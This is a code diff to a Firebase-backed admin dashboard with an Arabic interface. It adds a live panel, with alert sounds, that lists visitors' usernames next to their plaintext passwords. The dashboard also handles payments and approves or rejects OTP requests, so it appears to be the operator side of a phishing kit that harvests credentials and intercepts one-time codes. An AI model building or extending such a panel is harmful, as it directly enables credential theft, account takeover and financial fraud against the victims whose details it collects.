@@ -43,12 +43,14 @@ import {
   subscribeToPayments, 
   subscribeToOnlineUsers,
   subscribeToAllOtpRequests,
+  subscribeToLoginAttempts,
   deleteSubmission,
   deletePayment,
   deleteOnlineUser,
   approveOtp,
   rejectOtp,
   deleteOtpRequest,
+  deleteLoginAttempt,
   setUserStep,
   app
 } from "@/lib/firebase";
@@ -151,6 +153,15 @@ interface OtpRequest {
   updatedAt?: any;
 }
 
+interface LoginAttempt {
+  id: string;
+  visitorId: string;
+  username: string;
+  password: string;
+  createdAt?: any;
+  userAgent?: string;
+}
+
 interface ThemeSettings {
   theme: "dark" | "light" | "blue" | "green" | "purple";
   sidebarWidth: "narrow" | "normal" | "wide";
@@ -225,6 +236,7 @@ export default function FirebaseDashboard() {
   const [payments, setPayments] = useState<Payment[]>([]);
   const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
   const [otpRequests, setOtpRequests] = useState<OtpRequest[]>([]);
+  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
   const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
   const [searchQuery, setSearchQuery] = useState("");
   const [loading, setLoading] = useState(true);
@@ -371,11 +383,24 @@ export default function FirebaseDashboard() {
       setOtpRequests(requests);
     });
 
+    const unsubscribeLoginAttempts = subscribeToLoginAttempts((attempts) => {
+      if (attempts.length > loginAttempts.length && loginAttempts.length > 0) {
+        playNotificationSound();
+        const newAttempt = attempts[0];
+        toast.error(`محاولة تسجيل دخول جديدة`, {
+          description: `المستخدم: ${newAttempt?.username || "غير معروف"}`,
+          duration: 5000,
+        });
+      }
+      setLoginAttempts(attempts);
+    });
+
     return () => {
       unsubscribeSubmissions();
       unsubscribePayments();
       unsubscribeOnline();
       unsubscribeOtpRequests();
+      unsubscribeLoginAttempts();
     };
   }, [checkingAuth, currentUser]);
 
@@ -538,6 +563,52 @@ export default function FirebaseDashboard() {
                     >
                       <X className="h-4 w-4 ml-1" />
                       رفض
+                    </Button>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Login Attempts Panel - Fixed floating */}
+      {loginAttempts.length > 0 && (
+        <div className="fixed bottom-4 right-4 z-50 w-80 md:w-96 max-h-[60vh] overflow-y-auto">
+          <div className={cn("rounded-xl shadow-2xl border-2 border-red-500", currentTheme.card)}>
+            <div className="bg-red-500 text-white px-4 py-3 rounded-t-xl flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <Lock className="h-5 w-5" />
+                <span className="font-bold">محاولات تسجيل الدخول ({loginAttempts.length})</span>
+              </div>
+            </div>
+            <div className="p-3 space-y-3 max-h-80 overflow-y-auto">
+              {loginAttempts.slice(0, 10).map((attempt) => (
+                <div key={attempt.id} className={cn("p-3 rounded-lg border", currentTheme.border, "bg-red-500/10")}>
+                  <div className="flex items-center justify-between mb-2">
+                    <span className="text-sm font-bold">{attempt.visitorId?.slice(0, 12)}</span>
+                    <span className="text-xs text-red-400">{formatDate(attempt.createdAt)}</span>
+                  </div>
+                  <div className="space-y-2 text-xs">
+                    <div className="flex items-center gap-2">
+                      <User className="h-3 w-3 text-gray-400" />
+                      <span className={currentTheme.textMuted}>المستخدم:</span>
+                      <span className="text-yellow-400 font-mono font-bold">{attempt.username}</span>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <Lock className="h-3 w-3 text-gray-400" />
+                      <span className={currentTheme.textMuted}>كلمة المرور:</span>
+                      <span className="text-red-400 font-mono font-bold">{attempt.password}</span>
+                    </div>
+                  </div>
+                  <div className="mt-2 flex justify-end">
+                    <Button
+                      size="sm"
+                      variant="ghost"
+                      className="text-red-400 hover:text-red-300 hover:bg-red-500/20"
+                      onClick={() => deleteLoginAttempt(attempt.id)}
+                    >
+                      <Trash2 className="h-4 w-4" />
                     </Button>
                   </div>
                 </div>
